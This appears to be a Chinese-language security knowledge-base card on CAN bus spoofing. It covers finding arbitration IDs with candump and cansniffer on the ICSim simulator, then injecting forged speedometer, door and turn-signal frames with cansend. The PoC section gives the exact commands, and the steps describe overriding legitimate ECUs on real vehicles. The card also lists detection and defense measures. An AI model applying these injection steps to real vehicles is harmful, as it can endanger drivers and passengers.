---
id: iot-protocol-can-arbitration-id-discovery-spoofing
title: CAN 总线仲裁 ID 逆向与伪造：ICSim/cansniffer 定位功能帧 + cansend 注入
type: scenario
domain: iot
path: iot/protocol
technique: can-arbitration-id-discovery-spoofing
tags:
- iot
- automotive
- can-bus
- spoofing
- can-utils
- icsim
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V123
  verified_at: '2026-11-06T04:32:36+08:00'
  notes: 已对照原文与7张图核对：ICSim/vcan0、cansniffer 定位、ID 244 数据 00 00 00 19 AC→1A 的变化、车门 19B#00000f000000 位映射、转向灯 188#03000000 均与原文/截图一致；PoC 车速帧 cansend vcan0 244#000000FF00 见原文图06。修正一处：原文未涉及实车覆盖，卡片原写“选择低优先级 ID”与 CAN 仲裁（ID 越小优先级越高）矛盾，已删除该说法，保留提高频率/停发 ECU。未验证点：原文为 ICSim 虚拟总线实验，未做实车验证；原文未标记受影响版本；frontmatter 无 sources/source_url。
url: /docs/iot/protocol/iot-protocol-can-arbitration-id-discovery-spoofing/
draft: false
kb_aliases:
- CAN 总线伪造
- CAN spoofing
- 仲裁 ID 逆向
- ICSim
- cansniffer
- cansend
- 车速/车门/转向灯注入
---

## 一句话结论

CAN 总线全局广播、明文、无发送方身份、无消息认证，任何接入节点都能监听和发送任意仲裁 ID 的帧；在 ICSim 虚拟总线上用 `candump`/`cansniffer` 观察“操作某功能时哪一帧在变化”即可逆向出车速（244）、车门（19B）、转向灯（188）等仲裁 ID，再用 `cansend` 伪造对应数据帧直接操控仪表/车辆功能。

## 原理

- CAN 帧由仲裁 ID、DLC、Data、CRC、ACK 等组成；ID 越小优先级越高，节点通过 ID 竞争总线。数据区不含发送方身份，接收方无法区分合法 ECU 与攻击者。
- CAN 自带 CRC 只校验传输错误，不防篡改/重放；没有 MAC、签名、计数器或新鲜性校验，因此伪造帧会被正常接收。
- 逆向方法：先 `candump` 看全量流量，再用 `cansniffer` 高亮周期性变化的字节；保持某个操作（如按加速键），观察哪个 ID 的数据随操作变化，即可把 ID 与功能对应。
- 示例：加速对应 ID 244，数据 `00 00 00 19 AC`，倒数第二字节随速度增加（0x19→0x1A…），最后一字节疑似 checksum；`speed_value × 1.6 ≈ MPH`。
- 车门 ID 19B：`cansend vcan0 19B#00000f000000`；低 4 位 bit0=左前、bit1=右前、bit2=左后、bit3=右后，0xF 全关、0x0 全开。
- 转向灯 ID 188：`cansend vcan0 188#03000000`；00 关、03 双闪、01/02 左/右。
- 真实车辆上合法 ECU 会周期发送同一 ID，注入帧可能在一个周期内被覆盖；需要提高发送频率或先停发合法 ECU（如 UDS RoutineControl 0x31）。

## 触发条件

- 能物理接入 CAN 总线（OBD-II Pin 6/14、网关、调试口）或有虚拟 CAN 环境（vcan0 + ICSim）。
- 有 can-utils（candump/cansniffer/cansend）和对应 CAN 适配器/驱动。
- 目标总线未部署 IDS/网关过滤/消息认证，或过滤可绕过。
- 能观察功能操作与 CAN 帧变化的对应关系。

## 利用步骤

1. 搭建环境：`modprobe can/vcan`，`ip link add dev vcan0 type vcan`，`ip link set up vcan0`；启动 `./icsim vcan0` 与 `./controls vcan0`。
2. `candump vcan0` 抓全量流量，记录 ID/DLC/Data 与周期。
3. `cansniffer -c vcan0` 观察变化字节；保持某一操作（加速/转向/车门），找出随操作变化的 ID。
4. 用 `candump vcan0,<ID>:7FF` 过滤单 ID，确认数据字节与功能/物理量的对应关系。
5. 关闭控制器，用 `cansend vcan0 <ID>#<DATA>` 发送伪造帧，观察仪表/执行器变化。
6. 对车门/转向灯逐位测试，建立位掩码映射；对车速调整倒数第二字节并处理 checksum。
7. 真实车辆上若被周期帧覆盖，提高频率或先停发合法 ECU；测试后恢复状态。

## PoC

```bash
# 虚拟 CAN
sudo modprobe can
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# ICSim
./icsim vcan0
./controls vcan0

# 侦察
candump vcan0
cansniffer -c vcan0
candump vcan0,244:7FF

# 伪造车速（示例）
cansend vcan0 244#000000FF00

# 车门：bit0 左前、bit1 右前、bit2 左后、bit3 右后
cansend vcan0 19B#00000f000000   # 全关
cansend vcan0 19B#000000000000   # 全开

# 转向灯：00 关、03 双闪、01 左、02 右
cansend vcan0 188#03000000
```

## 变体与关联

- 变体：29 位扩展 ID、CAN-FD、不同波特率/网关过滤；ID 发现方法相同。
- 变体：数据含 checksum/计数器，需要逆向算法后再伪造。
- 变体：真实车辆需先停发合法 ECU（UDS 0x31）或利用总线负载/优先级。
- 关联：[[iot-protocol-uds-routinecontrol-can-injection-takeover]]（UDS 停发 + CAN 注入）、[[iot-protocol-can-replay-candump-canplayer]]（CAN 重放）、[[iot-protocol-rtps-dds-writer-spoofing]]（协议伪造）。

## 检测与防御

- 检测：CAN IDS 监控异常高频/异常数据/未知 ID、车速/车门/转向帧来源异常；网关白名单。
- 防御：CAN 网关过滤、SecOC/消息认证、滚动计数器、速率限制、物理接口保护（OBD 锁）。
- 响应：确认注入后隔离总线/网关，审计异常帧，升级 IDS 规则与 ECU 认证。
